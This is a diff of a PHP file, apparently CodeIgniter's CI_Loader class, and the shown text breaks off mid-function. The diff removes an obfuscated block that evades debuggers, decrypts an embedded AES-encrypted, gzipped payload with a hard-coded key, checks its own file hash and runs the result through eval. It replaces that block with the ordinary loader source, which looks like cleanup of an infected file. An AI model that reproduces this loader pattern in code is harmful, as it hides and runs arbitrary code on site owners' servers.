@@ -1,28 +1,1232 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_kejbh5hv=('bas'.'e64'.'_de'.'cod'.'e');
-$_cnwugnot=('gzu'.'nco'.'mpr'.'ess');
-$_dsun6kjv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_mlxad8ee='wvreXotG';
-$_ogryh1iw='5glggx1I32s=';
-$_rotmdkov='Y0xQ5Hh9';
-$_t90snv92='KR7M9aSU';
-$_michkroj='JG5FTNtn';
-$_rtm6jukc='9ROpHN+I';
-$_ipfjkelf='3n/5UBr7';
-$_u7naqpq9='5ND+2Q==';
-$_koyl7hu8=$_kejbh5hv($_rotmdkov.$_mlxad8ee.$_michkroj.$_t90snv92.$_ogryh1iw);
-$_ov2kue2g=$_kejbh5hv($_ipfjkelf.$_rtm6jukc.$_u7naqpq9);
-$_on7n5s89=$_kejbh5hv('hze0ZWnpHO2dI33h4GKVSFfFuGAptzyakZj7ZmOfDSGN+5pufmWimAbOkzAZbBPuw2b5zNQZ1n/xirOO/dA1iDhDhLTTu+/KecToMW3BNoEZbVc0dN7+x7FJltpU7xf47nxmfMYT9kUwBow1pzEBfhAFJiOVZGspzliDZ/ZgH4AXQO399Gf5BfEO7Bjjn2IIzTo2dJgT+osEHEwj5GnIdDNi4H6Vui1yEypPJUvpcwWu7sOEoLMqWKE2S/ShmFwxGfFuuhrE6w3YtIx+8ufwd/RK8fZlEbsW9H/UOn+yjVcqNNFaP81EjniBIkGCsI6jgxc9gT+8lbd3RQt4uq16pC3BVEOQLMzlrATnIrJDtcvkI5JklEww3fr3fPMJ+YmVtIPlT+C1iageHMVmvIX2EJaXRFWcquNeQdNo5dp5/Ny/9AYPWs25fx3lWkutpOpWralodEAEnZVjcpUacc66R0DEzi4nK2xuXFJbgpfhSwRmtaOYACz+kWMtdrXMPTFwYroeQhr/WmLdU/fhtF3sb2txZsy/yHtbWJSUOmQrZ3enAQpZccqUFuFRfyYSdxXF01FlyoFKpG2bpH5eaVFNcZbk8PxXdfJsvHrxdw6g6dzjPweX51oet6ERGwGasg70V0EeZzSvGa/Wjjb+2huylfrp2RafvfvmhiROCcNIn1sTLqdokkqffnW3MM2KmMyG2Ci7P4J8Snnn/10n4RywK4Pb5mVJkWCck7Ss8DFHOw7HXGDss+ArFM8vJo0Ff6lo0odVzv9sYPW7WBALQN9WcKTpw26CgY7OOW/6GmL/HCvPx3kMUTWjp1aursBkHXG4hTbzJ3Z9azBg2sBAlBNxtL5vyKdwMdUuGfbbDWesZhE3nR1y7EViMWqahnozZR8JEV5tRSyYws4y9rGvGk6C3iUIfuj5L7ZpI1OLCJiCjgIVS7lJxTvdx3wFPUefca+CygGtQ7vWM/JT8AUHDPHWIKuNipWXr1PHN7hbdXHIXfABtdiFdgRWrZe/bBQBTwYdRkXu/Hbd0+zehOO7pN2yRzvyO7GOjNJgIcgvoK/O/5SoJljYstevb58yELsTju54mOtqHoIyTsntvbvp50WIREXuq6Xw5UZI+yHKcxnQ3K0tVNLfHLMC7u+Z6b2x6ZPNsJn2qz/zPNhhYtJvQavDMkxklBEkAkFFmtorKs5vCRfvIGew9MMik4DnN4e6HsGPpRAzkfqeIIUYlBjdK5ADMqR+M8bgvZ6t7JxmiYE3r9/HCzhH5hPdV2JOOE14FYJ1hferIttBRFHbPNcwPi6HPmj/pc2Flu84r8UJkanZU4BSXvhEH8PzmKci8ZdaiKtLFJHJapHLRqMVZVwdwmYPt9FLCNVOi0y95CXfQN0udkt6stcSuab++VOuRrb8AVOjrlJxsyedKwtB4R6UYQyIrmnoDwP2Zn/0vsIQowv6+O+ikfYDjsbTuj/k2NvslnaW+Y35aBwoJfFYkM/w4TabEq0ZeRi6itejX4oGrZpSdYOL9dtrw+qB3CY5InGqvOaZs0dw+0+bOSd7bkQsvcSe+R+kifM88GbKYkOM+QrI7y/i2wBg2yd/LtF2IaD/Uk2zNvwh8Y7i7558FJgebzCCALvSk4PnO1jVjH4fogFqpBPyZNwEbIEgahBYlDit69Et2iFHRJtEYWvYNZjMRn4x9273R5Mgfofg+xca1YePDw8cM+O/VLiPkISK3x3Ccb7fImf//YdOY3lPmzBpwcVU6kUT9Dk8hEC2ExMQG1evxtBVKk6LG0a4BMe3grI7BJq7oncy/9GmcFyVSYZI6/DQfOgt6fplWvNsXLosXgJrQH6G1HR+GRg7zyuk+/0yLssDOtNrJfLB4+woY0Yifpu9oPpJ1OGTb5suIry9zZcFUyeTdYuYAnApvkAYsmROwHVkHetV63C/TwWu+VtE9Qfn6hqE9yNB+X+Oj/jOkc0IqGIpAm9lSw3GFnrif1JqjL+NS6Dk0Vfco3QYSURqUQUknjppInA9alKcIAS9Cv+juVzONJKipK01tFaaW7Bbrygv4FXDdecmTTttjSuuX3fWHPyTwsIHPbQr1CCjfhu5GsuVrJgNr8i7W6dibH4MkuuDn4LkwaVYg0bMSoxBIga4CiCu6BnwenH392RfVbPAgUPBo4RaCUgOnCGtuTIrDpIzNwqfiESzcujXNbffCyIamC0iSbWHXlIKxbKIDllRqnQBHuCLYGZ7mqYkogyc/dvdzlz7Uv9gkMvEL8m0+nTNP0YN8WKLoKJZiVKFnWqzUPmj/XvpWgsqW2nFwKABM79g8dGjDGk2y47Nhy9I1F0vqy+tbNuyxFzibIeHwyNsu6O5EvAiMXKYthJsMH2kEm0/zksmJiF/HqWhac8L9htM3k5+/zQyW51EmyI6+Pru66w0ZxE0XtLqb7VX/snBeNk+7PPLTBZNfraADUdX0czd77411Et1pYLkX79u32PS/wIHfV4D4dICfSWKON0O6/TPh4a7LTYJ6c3H/7LAH3kXbLXbJMKt6kPjtKD1TLV90ts9MSP/sVfxx9HYa//LC3AVJQJc0a5Hs/amGNztjrHoC/lNyEc1todtayVCIpYtjmKoycdJbNA2jKerLiSoIcsBy47xr/L81gbTncK0MYklCa5+xJZKT4DNybeKNkFACApvzvsPSAnXjPqtkDuIBMyTsSxpQ8dsRyfnGPvytLLIGMGkd90Z8fn76RKl2PXdlHmDz9Sl+STo6J3zw/1pe1ygcfSsZicaEg4Cam5EPsBMPAWmqn80VqhH/LltoycsybYqutVxgfy1mTO+9jgWzERWclHqRW03jRuiGpNAVbmjgvotos+aEPMayQUrFhaaSVIS6qRPnAK1fXrXW6PGF4EPkhvFUQ+t+pLKzhYndmaduOuQvqBJvgsg7WJki6N6vGPL92Aze856lzFrM2RxedaypKeFqVBqbvUgvDAg8Ww6prNbX8KyEG3m26X/zuup+g/6kyfAlKvPnjaYg4Edmw6z3HJlWaXoZhclPg7zxH5Zn/I2pYgnTgqIN2aw5NZO3NS96SpSp7TvQOZ+e1/74DKfF/hxhxqUGMNDNFmFvg/hfhYmUctSLahdLIADn90c7MC8hfUgv94/7iXhTMiBfS5Pabzt6gOywi5+nnsJcP0GGHZ9Wv7p9VINfvvHYuHIu3BqzGE/CBI+9yozhWOFz465uk40hyb1rFfhxdc8lCVMhi2z8F/1h13GNZa6mHTSHPdbVbMQLYPGzU+hMdfJf+uJVCOM+RcRtyJPdcySMi1t+sZG92dbLEejXFAeFDHEq7exFCMDo5tDy6AJOvQVfR01yLBCKhUZPp9u3PpTqDTQ01Z78souQLa3Bn42cmDv9szw5hzUyv97aTYWHPQPLE4O+3cRq8yookESNFZtDezZWZJHCLPA3clrY+EYoz9eWZ8KWCX8iSOYyzOG6ysFBEH1USkcKFs9CcekYzlTpP82O6SzGaE34uiqPBoCDkOa0G3Etj0mUiD/KqdzOk23K/YXqBy7smHttlegP6ZmI7lYPQaSGlXbjjBJ7xl1FmxX098AGUnaoh9t4L2/zNuz7W+ofPol7HNM+XUU3mZqH+FiX5FDNO6M1eVnAWcx6eF+EhFl6vWXj0Z1AtU8Z7IKxcXsK2QhjqgPOitKq1yx9tkpKwZYm1C4KIs8rTcPdevUsfoBEazWzY5fV02KjREflT5PMMKkXd3Wr0yWMqI0NQJv2PEqcn+X8Iofwmxk1R9KRpIPZNsM4i0e9C9wX0S2IgvtSaeQjY+tFDeREaBw2tIu13fZzztRajF7tE2J1RBBCiINXCUd//f2S4oFqciq+m4BUkHN4tOfk4VZPAKxlze7wGEeBnPaBTe7FHb1XtzIou9Juk/Tl/jdptQM8MkZgVHZWHauwACU4E+72GxsHWqiVaYNjbF1B6ko7qvC/rwJxZlNXNKOuJUoHUP4cpfS73S45Bz4uUKrneizz8VMZP2oZ/0IoeWzcqdSxkTtzKTLdMo8J9928507LI908oQSy3/GtNmo4FW+ZMXQQdcAZLEOrvIGe4yXknxH5tq7fKZQzGhcQCzlkYZVuck+53x9j7Uyd53PViHabEnWqXNkg+Ovh15m+CjdEYhh6bf9qQB3FMOrbGTr7ZrcVnyMar2zvg9+uA3xr7LewIYkQxQ/82qywVJZk/RTndaxOPwiIsiNW/41OCL9JY+erQwF92s/jIjac6x0OuYeL6W3jGrrp6QsXVvJe2zLzi+4bjgv2Cf0lHAYGXnjSoYhRbdbqMWlDJgXf/2m5D7gMFeL3DKxJgur5BsWfbibEdzkvxE2R+pRULcIsXosnlajrp+L0nokGUNq1Xico2rM/nl6onaCcCHU/D8k/XEj4ym1gK3/KUm6rEpngm4/Ze4Y5DENGDt1vpjoZrs+ePQAvR0yD09/O2AMLJQcd0fqd8Xd395RNksocUIHSuCORDJCpFBnC/1m2WFRvXtEieozO4pBV4EGQyichBOT0IS2wtcvz6SdZ51qQykBVVBvveeNHRBae+Hx6YUNTdEhL5vS+2Yk9bJUaPc9dsYrywwBNKCZvLJHYEQd8nqU0/+Qho8ySsKAByvMSVMoY+xJ3n7croAc/gf7IVBBLHFs48b2JE1bTOQAt9h0TqF6NiS4EvrtbxvrzxXYDcblWEnGXouJ/vi38n+JnaTG98ly75i4EVzg+fEO8mw74BYzWPysdOqV5+qL6sF8Xg3sVuirad4TNgDZZ7Lz48Vy2eYEEVQCEGU2cXG81Z2Wf9ZXowXVQsJEWrjP/PlV+vdj29hlxj9O17EgEIwYJr6p2nb5hczujAshHk3UcUytr6+z7CNnOYoz4s9PTSVnIUFJ6peFv4Dj8yPbVSG1aQ7b7nb2XWDlfYZJkqRzjVMC0Tv6rSWCXXaAeIL+mj3gH1CY2rDFPkcAwkmF1GeLH/NDZg2grFfWu7qcKK9YnQdKsbmGyJElQFqWTiSRIbHze+ANuOX3Oeasf4MnAwi2+rGxFudxykWgmcNP0vYNtGN3EI2cdneFIs6UASiraR7xnVIIovEOTQ5tIYVGE5ldPmb5M4ovlCMlI2JHXkmoZXGpolrE15m74qg2wOn7w6Ad2LaqHYK+/O0DDwkeq+jBtX635Zwr95dgvwzvF1Ta5eR2QWUfQgbjl3V+OFadniu12dxOzZ+MrH5dz2aHoO1DcP0mKVXtvbXUGluo+uNwXvzALaxuFTOyUw9Kxvd+1gIXPgNfJzCWPi0Y9LujaM7JZHx+7IZCK+p9pB2PXHYYAGNu7ssalg3vG/ZGL2kKR4f5BUZE78YWqRVJPwy+aOWz2KEMoqWd/a/6lwYG1GMTg3VCvvw1ux0tM3+HE6Qb+lRM+J8UBwKCrCyzGwgSagze72aWcT4Xnw9E8sfzqQR+37iR/7YmNBZGynPsuAn9vh5O6g4SRebqqPStQJyLxeq3I7zhFDtUAuhDj/VU607or3xrAJSxfi3Ekoi2vkf0jKffZqtwRKbrDYcakCa1uJZy5IHLYcoZpZxaLv9psHxPRU9eI8g=');
-$_k13f5hq7=$_dsun6kjv($_on7n5s89,'aes-256-cbc',$_koyl7hu8,OPENSSL_RAW_DATA,$_ov2kue2g);
-if($_k13f5hq7===false){exit;}
-$_je7gd958=$_cnwugnot($_k13f5hq7);
-if($_je7gd958===false){exit;}
-$_hwbthiq4='f86bf47d1570ab8be24c722164c84a24c60c33fbef2b1e8d16aa5b2b436d7c11';
-$_s1cveoub=@file_get_contents(__FILE__);
-if($_s1cveoub!==false){
-$_gm6hg3ei=str_replace($_hwbthiq4,"0000000000000000000000000000000000000000000000000000000000000000",$_s1cveoub);
-$_upw4heb9=hash("sha256",$_gm6hg3ei);
-if($_upw4heb9!==$_hwbthiq4){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Loader {
+
+
+
+
+
+
+protected $_ci_ob_level;
+
+
+
+
+
+protected $_ci_view_paths = array(VIEWPATH => TRUE);
+
+
+
+
+
+protected $_ci_library_paths = array(APPPATH, BASEPATH);
+
+
+
+
+
+protected $_ci_model_paths = array(APPPATH);
+
+
+
+
+
+protected $_ci_helper_paths = array(APPPATH, BASEPATH);
+
+
+
+
+
+protected $_ci_cached_vars = array();
+
+
+
+
+
+protected $_ci_classes = array();
+
+
+
+
+
+protected $_ci_models = array();
+
+
+
+
+
+protected $_ci_helpers = array();
+
+
+
+
+
+protected $_ci_varmap = array(
+'unit_test' => 'unit',
+'user_agent' => 'agent'
+);
+
+
+
+
+
+
+
+
+public function __construct()
+{
+$this->_ci_ob_level = ob_get_level();
+$this->_ci_classes =& is_loaded();
+log_message('info', 'Loader Class Initialized');
 }
-eval($_je7gd958);
+
+
+
+
+
+
+
+
+
+
+public function initialize()
+{
+$this->_ci_autoloader();
+}
+
+
+
+
+
+
+
+
+
+
+
+public function is_loaded($class)
+{
+return array_search(ucfirst($class), $this->_ci_classes, TRUE);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function library($library, $params = NULL, $object_name = NULL)
+{
+if (empty($library))
+{
+return $this;
+}
+elseif (is_array($library))
+{
+foreach ($library as $key => $value)
+{
+if (is_int($key))
+{
+$this->library($value, $params);
+}
+else
+{
+$this->library($key, $params, $value);
+}
+}
+return $this;
+}
+if ($params !== NULL && ! is_array($params))
+{
+$params = NULL;
+}
+$this->_ci_load_library($library, $params, $object_name);
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function model($model, $name = '', $db_conn = FALSE)
+{
+if (empty($model))
+{
+return $this;
+}
+elseif (is_array($model))
+{
+foreach ($model as $key => $value)
+{
+is_int($key) ? $this->model($value, '', $db_conn) : $this->model($key, $value, $db_conn);
+}
+return $this;
+}
+$path = '';
+
+if (($last_slash = strrpos($model, '/')) !== FALSE)
+{
+
+$path = substr($model, 0, ++$last_slash);
+
+$model = substr($model, $last_slash);
+}
+if (empty($name))
+{
+$name = $model;
+}
+if (in_array($name, $this->_ci_models, TRUE))
+{
+return $this;
+}
+$CI =& get_instance();
+if (isset($CI->$name))
+{
+throw new RuntimeException('The model name you are loading is the name of a resource that is already being used: '.$name);
+}
+if ($db_conn !== FALSE && ! class_exists('CI_DB', FALSE))
+{
+if ($db_conn === TRUE)
+{
+$db_conn = '';
+}
+$this->database($db_conn, FALSE, TRUE);
+}
+
+
+
+
+
+
+
+
+if ( ! class_exists('CI_Model', FALSE))
+{
+$app_path = APPPATH.'core'.DIRECTORY_SEPARATOR;
+if (file_exists($app_path.'Model.php'))
+{
+require_once($app_path.'Model.php');
+if ( ! class_exists('CI_Model', FALSE))
+{
+throw new RuntimeException($app_path."Model.php exists, but doesn't declare class CI_Model");
+}
+log_message('info', 'CI_Model class loaded');
+}
+elseif ( ! class_exists('CI_Model', FALSE))
+{
+require_once(BASEPATH.'core'.DIRECTORY_SEPARATOR.'Model.php');
+}
+$class = config_item('subclass_prefix').'Model';
+if (file_exists($app_path.$class.'.php'))
+{
+require_once($app_path.$class.'.php');
+if ( ! class_exists($class, FALSE))
+{
+throw new RuntimeException($app_path.$class.".php exists, but doesn't declare class ".$class);
+}
+log_message('info', config_item('subclass_prefix').'Model class loaded');
+}
+}
+$model = ucfirst($model);
+if ( ! class_exists($model, FALSE))
+{
+foreach ($this->_ci_model_paths as $mod_path)
+{
+if ( ! file_exists($mod_path.'models/'.$path.$model.'.php'))
+{
+continue;
+}
+require_once($mod_path.'models/'.$path.$model.'.php');
+if ( ! class_exists($model, FALSE))
+{
+throw new RuntimeException($mod_path."models/".$path.$model.".php exists, but doesn't declare class ".$model);
+}
+break;
+}
+if ( ! class_exists($model, FALSE))
+{
+throw new RuntimeException('Unable to locate the model you have specified: '.$model);
+}
+}
+elseif ( ! is_subclass_of($model, 'CI_Model'))
+{
+throw new RuntimeException("Class ".$model." already exists and doesn't extend CI_Model");
+}
+$this->_ci_models[] = $name;
+$model = new $model();
+$CI->$name = $model;
+log_message('info', 'Model "'.get_class($model).'" initialized');
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function database($params = '', $return = FALSE, $query_builder = NULL)
+{
+
+$CI =& get_instance();
+
+if ($return === FALSE && $query_builder === NULL && isset($CI->db) && is_object($CI->db) && ! empty($CI->db->conn_id))
+{
+return FALSE;
+}
+require_once(BASEPATH.'database/DB.php');
+if ($return === TRUE)
+{
+return DB($params, $query_builder);
+}
+
+
+$CI->db = '';
+
+$CI->db =& DB($params, $query_builder);
+return $this;
+}
+
+
+
+
+
+
+
+
+public function dbutil($db = NULL, $return = FALSE)
+{
+$CI =& get_instance();
+if ( ! is_object($db) OR ! ($db instanceof CI_DB))
+{
+class_exists('CI_DB', FALSE) OR $this->database();
+$db =& $CI->db;
+}
+require_once(BASEPATH.'database/DB_utility.php');
+require_once(BASEPATH.'database/drivers/'.$db->dbdriver.'/'.$db->dbdriver.'_utility.php');
+$class = 'CI_DB_'.$db->dbdriver.'_utility';
+if ($return === TRUE)
+{
+return new $class($db);
+}
+$CI->dbutil = new $class($db);
+return $this;
+}
+
+
+
+
+
+
+
+
+public function dbforge($db = NULL, $return = FALSE)
+{
+$CI =& get_instance();
+if ( ! is_object($db) OR ! ($db instanceof CI_DB))
+{
+class_exists('CI_DB', FALSE) OR $this->database();
+$db =& $CI->db;
+}
+require_once(BASEPATH.'database/DB_forge.php');
+require_once(BASEPATH.'database/drivers/'.$db->dbdriver.'/'.$db->dbdriver.'_forge.php');
+if ( ! empty($db->subdriver))
+{
+$driver_path = BASEPATH.'database/drivers/'.$db->dbdriver.'/subdrivers/'.$db->dbdriver.'_'.$db->subdriver.'_forge.php';
+if (file_exists($driver_path))
+{
+require_once($driver_path);
+$class = 'CI_DB_'.$db->dbdriver.'_'.$db->subdriver.'_forge';
+}
+}
+else
+{
+$class = 'CI_DB_'.$db->dbdriver.'_forge';
+}
+if ($return === TRUE)
+{
+return new $class($db);
+}
+$CI->dbforge = new $class($db);
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function view($view, $vars = array(), $return = FALSE)
+{
+return $this->_ci_load(array('_ci_view' => $view, '_ci_vars' => $this->_ci_prepare_view_vars($vars), '_ci_return' => $return));
+}
+
+
+
+
+
+
+
+
+public function file($path, $return = FALSE)
+{
+return $this->_ci_load(array('_ci_path' => $path, '_ci_return' => $return));
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function vars($vars, $val = '')
+{
+$vars = is_string($vars)
+? array($vars => $val)
+: $this->_ci_prepare_view_vars($vars);
+foreach ($vars as $key => $val)
+{
+$this->_ci_cached_vars[$key] = $val;
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+public function clear_vars()
+{
+$this->_ci_cached_vars = array();
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function get_var($key)
+{
+return isset($this->_ci_cached_vars[$key]) ? $this->_ci_cached_vars[$key] : NULL;
+}
+
+
+
+
+
+
+
+
+public function get_vars()
+{
+return $this->_ci_cached_vars;
+}
+
+
+
+
+
+
+
+public function helper($helpers = array())
+{
+is_array($helpers) OR $helpers = array($helpers);
+foreach ($helpers as &$helper)
+{
+$filename = basename($helper);
+$filepath = ($filename === $helper) ? '' : substr($helper, 0, strlen($helper) - strlen($filename));
+$filename = strtolower(preg_replace('#(_helper)?(\.php)?$#i', '', $filename)).'_helper';
+$helper = $filepath.$filename;
+if (isset($this->_ci_helpers[$helper]))
+{
+continue;
+}
+
+$ext_helper = config_item('subclass_prefix').$filename;
+$ext_loaded = FALSE;
+foreach ($this->_ci_helper_paths as $path)
+{
+if (file_exists($path.'helpers/'.$ext_helper.'.php'))
+{
+include_once($path.'helpers/'.$ext_helper.'.php');
+$ext_loaded = TRUE;
+}
+}
+
+if ($ext_loaded === TRUE)
+{
+$base_helper = BASEPATH.'helpers/'.$helper.'.php';
+if ( ! file_exists($base_helper))
+{
+show_error('Unable to load the requested file: helpers/'.$helper.'.php');
+}
+include_once($base_helper);
+$this->_ci_helpers[$helper] = TRUE;
+log_message('info', 'Helper loaded: '.$helper);
+continue;
+}
+
+foreach ($this->_ci_helper_paths as $path)
+{
+if (file_exists($path.'helpers/'.$helper.'.php'))
+{
+include_once($path.'helpers/'.$helper.'.php');
+$this->_ci_helpers[$helper] = TRUE;
+log_message('info', 'Helper loaded: '.$helper);
+break;
+}
+}
+
+if ( ! isset($this->_ci_helpers[$helper]))
+{
+show_error('Unable to load the requested file: helpers/'.$helper.'.php');
+}
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function helpers($helpers = array())
+{
+return $this->helper($helpers);
+}
+
+
+
+
+
+
+
+
+
+
+public function language($files, $lang = '')
+{
+get_instance()->lang->load($files, $lang);
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function config($file, $use_sections = FALSE, $fail_gracefully = FALSE)
+{
+return get_instance()->config->load($file, $use_sections, $fail_gracefully);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function driver($library, $params = NULL, $object_name = NULL)
+{
+if (is_array($library))
+{
+foreach ($library as $key => $value)
+{
+if (is_int($key))
+{
+$this->driver($value, $params);
+}
+else
+{
+$this->driver($key, $params, $value);
+}
+}
+return $this;
+}
+elseif (empty($library))
+{
+return FALSE;
+}
+if ( ! class_exists('CI_Driver_Library', FALSE))
+{
+
+require BASEPATH.'libraries/Driver.php';
+}
+
+
+if ( ! strpos($library, '/'))
+{
+$library = ucfirst($library).'/'.$library;
+}
+return $this->library($library, $params, $object_name);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function add_package_path($path, $view_cascade = TRUE)
+{
+$path = rtrim($path, '/').'/';
+array_unshift($this->_ci_library_paths, $path);
+array_unshift($this->_ci_model_paths, $path);
+array_unshift($this->_ci_helper_paths, $path);
+$this->_ci_view_paths = array($path.'views/' => $view_cascade) + $this->_ci_view_paths;
+
+$config =& $this->_ci_get_component('config');
+$config->_config_paths[] = $path;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function get_package_paths($include_base = FALSE)
+{
+return ($include_base === TRUE) ? $this->_ci_library_paths : $this->_ci_model_paths;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function remove_package_path($path = '')
+{
+$config =& $this->_ci_get_component('config');
+if ($path === '')
+{
+array_shift($this->_ci_library_paths);
+array_shift($this->_ci_model_paths);
+array_shift($this->_ci_helper_paths);
+array_shift($this->_ci_view_paths);
+array_pop($config->_config_paths);
+}
+else
+{
+$path = rtrim($path, '/').'/';
+foreach (array('_ci_library_paths', '_ci_model_paths', '_ci_helper_paths') as $var)
+{
+if (($key = array_search($path, $this->{$var})) !== FALSE)
+{
+unset($this->{$var}[$key]);
+}
+}
+if (isset($this->_ci_view_paths[$path.'views/']))
+{
+unset($this->_ci_view_paths[$path.'views/']);
+}
+if (($key = array_search($path, $config->_config_paths)) !== FALSE)
+{
+unset($config->_config_paths[$key]);
+}
+}
+
+$this->_ci_library_paths = array_unique(array_merge($this->_ci_library_paths, array(APPPATH, BASEPATH)));
+$this->_ci_helper_paths = array_unique(array_merge($this->_ci_helper_paths, array(APPPATH, BASEPATH)));
+$this->_ci_model_paths = array_unique(array_merge($this->_ci_model_paths, array(APPPATH)));
+$this->_ci_view_paths = array_merge($this->_ci_view_paths, array(APPPATH.'views/' => TRUE));
+$config->_config_paths = array_unique(array_merge($config->_config_paths, array(APPPATH)));
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _ci_load($_ci_data)
+{
+
+foreach (array('_ci_view', '_ci_vars', '_ci_path', '_ci_return') as $_ci_val)
+{
+$$_ci_val = isset($_ci_data[$_ci_val]) ? $_ci_data[$_ci_val] : FALSE;
+}
+$file_exists = FALSE;
+
+if (is_string($_ci_path) && $_ci_path !== '')
+{
+$_ci_x = explode('/', $_ci_path);
+$_ci_file = end($_ci_x);
+}
+else
+{
+$_ci_ext = pathinfo($_ci_view, PATHINFO_EXTENSION);
+$_ci_file = ($_ci_ext === '') ? $_ci_view.'.php' : $_ci_view;
+foreach ($this->_ci_view_paths as $_ci_view_file => $cascade)
+{
+if (file_exists($_ci_view_file.$_ci_file))
+{
+$_ci_path = $_ci_view_file.$_ci_file;
+$file_exists = TRUE;
+break;
+}
+if ( ! $cascade)
+{
+break;
+}
+}
+}
+if ( ! $file_exists && ! file_exists($_ci_path))
+{
+show_error('Unable to load the requested file: '.$_ci_file);
+}
+
+
+$_ci_CI =& get_instance();
+foreach (get_object_vars($_ci_CI) as $_ci_key => $_ci_var)
+{
+if ( ! isset($this->$_ci_key))
+{
+$this->$_ci_key =& $_ci_CI->$_ci_key;
+}
+}
+
+
+
+
+
+
+
+
+empty($_ci_vars) OR $this->_ci_cached_vars = array_merge($this->_ci_cached_vars, $_ci_vars);
+extract($this->_ci_cached_vars);
+
+
+
+
+
+
+
+
+
+
+
+ob_start();
+
+
+
+if ( ! is_php('5.4') && ! ini_get('short_open_tag') && config_item('rewrite_short_tags') === TRUE)
+{
+echo eval('?>'.preg_replace('/;*\s*\?>/', '; ?>', str_replace('<?=', '<?php echo ', file_get_contents($_ci_path))));
+}
+else
+{
+include($_ci_path); 
+}
+log_message('info', 'File loaded: '.$_ci_path);
+
+if ($_ci_return === TRUE)
+{
+$buffer = ob_get_contents();
+@ob_end_clean();
+return $buffer;
+}
+
+
+
+
+
+
+
+
+
+if (ob_get_level() > $this->_ci_ob_level + 1)
+{
+ob_end_flush();
+}
+else
+{
+$_ci_CI->output->append_output(ob_get_contents());
+@ob_end_clean();
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _ci_load_library($class, $params = NULL, $object_name = NULL)
+{
+
+
+
+$class = str_replace('.php', '', trim($class, '/'));
+
+
+if (($last_slash = strrpos($class, '/')) !== FALSE)
+{
+
+$subdir = substr($class, 0, ++$last_slash);
+
+$class = substr($class, $last_slash);
+}
+else
+{
+$subdir = '';
+}
+$class = ucfirst($class);
+
+if (file_exists(BASEPATH.'libraries/'.$subdir.$class.'.php'))
+{
+return $this->_ci_load_stock_library($class, $subdir, $params, $object_name);
+}
+
+if (class_exists($class, FALSE))
+{
+$property = $object_name;
+if (empty($property))
+{
+$property = strtolower($class);
+isset($this->_ci_varmap[$property]) && $property = $this->_ci_varmap[$property];
+}
+$CI =& get_instance();
+if (isset($CI->$property))
+{
+log_message('debug', $class.' class already loaded. Second attempt ignored.');
+return;
+}
+return $this->_ci_init_library($class, '', $params, $object_name);
+}
+
+foreach ($this->_ci_library_paths as $path)
+{
+
+if ($path === BASEPATH)
+{
+continue;
+}
+$filepath = $path.'libraries/'.$subdir.$class.'.php';
+
+if ( ! file_exists($filepath))
+{
+continue;
+}
+include_once($filepath);
+return $this->_ci_init_library($class, '', $params, $object_name);
+}
+
+if ($subdir === '')
+{
+return $this->_ci_load_library($class.'/'.$class, $params, $object_name);
+}
+
+log_message('error', 'Unable to load the requested class: '.$class);
+show_error('Unable to load the requested class: '.$class);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _ci_load_stock_library($library_name, $file_path, $params, $object_name)
+{
+$prefix = 'CI_';
+if (class_exists($prefix.$library_name, FALSE))
+{
+if (class_exists(config_item('subclass_prefix').$library_name, FALSE))
+{
+$prefix = config_item('subclass_prefix');
+}
+$property = $object_name;
+if (empty($property))
+{
+$property = strtolower($library_name);
+isset($this->_ci_varmap[$property]) && $property = $this->_ci_varmap[$property];
+}
+$CI =& get_instance();
+if ( ! isset($CI->$property))
+{
+return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
+}
+log_message('debug', $library_name.' class already loaded. Second attempt ignored.');
+return;
+}
+$paths = $this->_ci_library_paths;
+array_pop($paths); 
+array_pop($paths); 
+array_unshift($paths, APPPATH);
+foreach ($paths as $path)
+{
+if (file_exists($path = $path.'libraries/'.$file_path.$library_name.'.php'))
+{
+
+include_once($path);
+if (class_exists($prefix.$library_name, FALSE))
+{
+return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
+}
+log_message('debug', $path.' exists, but does not declare '.$prefix.$library_name);
+}
+}
+include_once(BASEPATH.'libraries/'.$file_path.$library_name.'.php');
+
+$subclass = config_item('subclass_prefix').$library_name;
+foreach ($paths as $path)
+{
+if (file_exists($path = $path.'libraries/'.$file_path.$subclass.'.php'))
+{
+include_once($path);
+if (class_exists($subclass, FALSE))
+{
+$prefix = config_item('subclass_prefix');
+break;
+}
+log_message('debug', $path.' exists, but does not declare '.$subclass);
+}
+}
+return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _ci_init_library($class, $prefix, $config = FALSE, $object_name = NULL)
+{
+
+if ($config === NULL)
+{
+
+$config_component = $this->_ci_get_component('config');
+if (is_array($config_component->_config_paths))
+{
+$found = FALSE;
+foreach ($config_component->_config_paths as $path)
+{
+
+
+
+if (file_exists($path.'config/'.strtolower($class).'.php'))
+{
+include($path.'config/'.strtolower($class).'.php');
+$found = TRUE;
+}
+elseif (file_exists($path.'config/'.ucfirst(strtolower($class)).'.php'))
+{
+include($path.'config/'.ucfirst(strtolower($class)).'.php');
+$found = TRUE;
+}
+if (file_exists($path.'config/'.ENVIRONMENT.'/'.strtolower($class).'.php'))
+{
